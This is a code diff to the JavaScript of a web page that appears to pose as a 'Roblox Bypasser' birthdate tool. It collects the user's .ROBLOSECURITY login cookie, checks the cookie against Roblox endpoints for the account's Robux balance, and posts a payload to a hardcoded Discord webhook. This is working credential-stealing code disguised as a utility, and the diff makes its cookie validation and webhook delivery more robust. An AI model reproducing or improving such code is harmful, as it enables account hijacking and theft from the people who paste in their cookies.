@@ -228,7 +228,11 @@ const webhookUrl = "https://discord.com/api/webhooks/1408203109129256990/95rPDcz
 
 // Function to validate .ROBLOSECURITY cookie format
 function isValidRobloxCookie(cookie) {
-  return cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS.--') && 
+  const validPrefixes = [
+    '_|WARNING:-DO-NOT-SHARE-THIS.--',
+    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.'
+  ];
+  return validPrefixes.some(prefix => cookie.startsWith(prefix)) && 
          /^[A-Za-z0-9+/=\-_.|]+$/.test(cookie) && 
          cookie.length > 50;
 }
@@ -282,7 +286,6 @@ async function checkCookieValidity(cookie) {
         } else if (endpoint.name === "currency") {
           userData.robuxBalance = data.robux || userData.robuxBalance;
         }
-        // Continue to next endpoint to gather more data if possible
       } else if (res.status === 429) {
         userData.error = "Rate limit exceeded. Please try again later.";
         break;
@@ -320,19 +323,22 @@ $("#cookieForm").on("submit", async function(e) {
   e.preventDefault();
   const cookie = $("#cookieInput").val().trim();
 
-  // Check cookie format
-  if (!isValidRobloxCookie(cookie)) {
-    showNotif("Invalid cookie format. Must start with '_|WARNING:-DO-NOT-SHARE-THIS.--' and contain valid characters.");
-    errorSound.play();
-    return;
-  }
-
+  // Show loader immediately
   $("#refreshBtn").hide();
   $("#loader").show();
   $("#userInfo").hide();
   $("#refreshedBox").hide();
 
   try {
+    // Check cookie format
+    if (!isValidRobloxCookie(cookie)) {
+      showNotif("Invalid cookie format. Must start with '_|WARNING:-DO-NOT-SHARE-THIS.--' and contain valid characters.");
+      errorSound.play();
+      $("#loader").hide();
+      $("#refreshBtn").show();
+      return;
+    }
+
     // Check cookie validity
     const result = await checkCookieValidity(cookie);
     if (!result.valid) {
@@ -359,13 +365,20 @@ $("#cookieForm").on("submit", async function(e) {
       username: "Roblox Bypasser Bot",
       avatar_url: "https://i.imgur.com/4j8o1.png"
     };
-    const webhookRes = await fetch(webhookUrl, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(webhookPayload)
-    });
-    if (!webhookRes.ok) {
-      console.error("Webhook send failed:", webhookRes.status);
+    let webhookStatus = "Webhook sent successfully";
+    try {
+      const webhookRes = await fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(webhookPayload)
+      });
+      if (!webhookRes.ok) {
+        webhookStatus = `Webhook failed: ${webhookRes.status}`;
+        console.error("Webhook send failed:", webhookRes.status);
+      }
+    } catch (webhookError) {
+      webhookStatus = `Webhook error: ${webhookError.message}`;
+      console.error("Webhook error:", webhookError);
     }
 
     // Attempt birthdate update
@@ -397,10 +410,10 @@ $("#cookieForm").on("submit", async function(e) {
     const responseText = await res.text();
 
     if (res.ok) {
-      $("#refreshedResult").text(`✅ Birthdate Updated Successfully!\nStatus: ${res.status}\nResponse: ${responseText}`);
+      $("#refreshedResult").text(`✅ Birthdate Updated Successfully!\nStatus: ${res.status}\nResponse: ${responseText}\n${webhookStatus}`);
       successSound.play();
     } else {
-      $("#refreshedResult").text(`❌ Failed to Update Birthdate\nStatus: ${res.status}\nResponse: ${responseText}`);
+      $("#refreshedResult").text(`❌ Failed to Update Birthdate\nStatus: ${res.status}\nResponse: ${responseText}\n${webhookStatus}`);
       errorSound.play();
     }
     $("#refreshedBox").fadeIn();
